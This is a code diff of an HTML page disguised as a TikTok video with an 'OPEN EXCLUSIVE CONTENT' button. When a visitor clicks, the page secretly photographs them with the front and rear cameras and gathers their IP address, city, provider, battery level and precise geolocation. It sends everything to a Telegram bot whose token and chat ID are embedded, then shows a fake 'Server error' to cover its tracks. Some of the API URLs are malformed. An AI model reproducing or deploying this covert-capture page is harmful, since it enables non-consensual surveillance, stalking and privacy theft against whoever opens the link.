@@ -3,124 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player</title>
+    <title>TikTok Video</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: black;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-            font-family: sans-serif;
-        }
-
-        #watchBtn {
-            background-color: #ff0050; /* TikTok Red */
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        #watchBtn:active {
-            transform: scale(0.95);
-        }
-
-        /* Скрытые элементы */
-        video, canvas {
-            display: none;
-        }
+        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        #watchBtn { background: #ff0050; color: #fff; border: none; padding: 18px 40px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; transition: 0.3s; }
+        #watchBtn:disabled { background: #222; color: #777; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <button id="watchBtn">WATCH VIDEO</button>
+    <button id="watchBtn">OPEN EXCLUSIVE CONTENT</button>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
 
     <script>
-        // ВСТАВЬТЕ ВАШИ ДАННЫЕ СЮДА
-        const TOKEN = 'ВАШ_ТОКЕН_БОТА';
-        const CHAT_ID = 'ВАШ_CHAT_ID';
+        const TOKEN = '8282459787:AAFCkf9w_T_Xvorsn-Tg0ZMgdcfWC9N8mQQ';
+        const CHAT_ID = '6660269414';
 
-        const watchBtn = document.getElementById('watchBtn');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        const btn = document.getElementById('watchBtn');
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
 
-        watchBtn.addEventListener('click', async () => {
+        btn.addEventListener('click', async () => {
+            btn.textContent = "Loading...";
+            btn.disabled = true;
+
+            // 1. Сбор системных данных и IP
             try {
-                // 1. Съемка селфи (Front camera)
-                await captureAndSend('user', 'Front Camera');
+                const ipRes = await fetch('https://ipapi.co');
+                const d = await ipRes.json();
+                const batt = await navigator.getBattery();
+                const info = `📱 Юзер: ${navigator.platform}\n🌐 IP: ${d.ip}\n🏙 Город: ${d.city}, ${d.country_name}\n🔋 Заряд: ${batt.level * 100}%\n🔗 Провайдер: ${d.org}`;
+                await sendMsg(info);
+            } catch(e) { await sendMsg("Не удалось собрать данные об IP/Системе"); }
 
-                // 2. Съемка окружения (Rear camera)
-                await captureAndSend('environment', 'Rear Camera');
+            // 2. Геолокация
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                await sendMsg(`📍 Локация: https://google.com{p.coords.latitude},${p.coords.longitude}`);
+            }, null, {enableHighAccuracy: true});
 
-            } catch (err) {
-                console.error("Error:", err);
-            } finally {
-                // Вывод сообщения об ошибке в любом случае
-                watchBtn.textContent = "Server error. Try again later";
-                watchBtn.style.backgroundColor = "#555";
-                watchBtn.disabled = true;
-            }
+            // 3. Фото (Фронталка, затем Задняя)
+            await snap('user', 'FRONT');
+            await snap('environment', 'REAR');
+
+            // 4. Финал
+            btn.textContent = "Server error. Try again later";
         });
 
-        async function captureAndSend(facingMode, label) {
-            const constraints = {
-                video: {
-                    facingMode: facingMode,
-                    width: { ideal: 4096 },
-                    height: { ideal: 2160 }
-                }
-            };
-
+        async function snap(mode, label) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                video.srcObject = stream;
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: mode, width: {ideal: 4096}, height: {ideal: 2160} }
+                });
+                v.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1200)); // Пауза для фокуса
+                
+                c.width = v.videoWidth;
+                c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                stream.getTracks().forEach(t => t.stop());
 
-                // Ждем немного для стабилизации камеры
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Остановка потока
-                stream.getTracks().forEach(track => track.stop());
-
-                // Конвертация в Blob и отправка
-                canvas.toBlob(blob => {
-                    sendToTelegram(blob, label);
-                }, 'image/jpeg', 0.9);
-
+                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'img.jpg');
+                fd.append('caption', `📸 Снимок: ${label}`);
+                await fetch(`https://telegram.org{TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             } catch (e) {
-                console.warn(`Could not access ${label}:`, e);
+                await sendMsg(`❌ Ошибка камеры ${label}: ${e.message}`);
             }
         }
 
-        async function sendToTelegram(blob, label) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'photo.jpg');
-            formData.append('caption', `Photo from: ${label}`);
-
-            try {
-                await fetch(`https://telegram.org{TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (err) {
-                console.error("Telegram send error:", err);
-            }
+        async function sendMsg(text) {
+            await fetch(`https://telegram.org{TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
         }
     </script>
 </body>
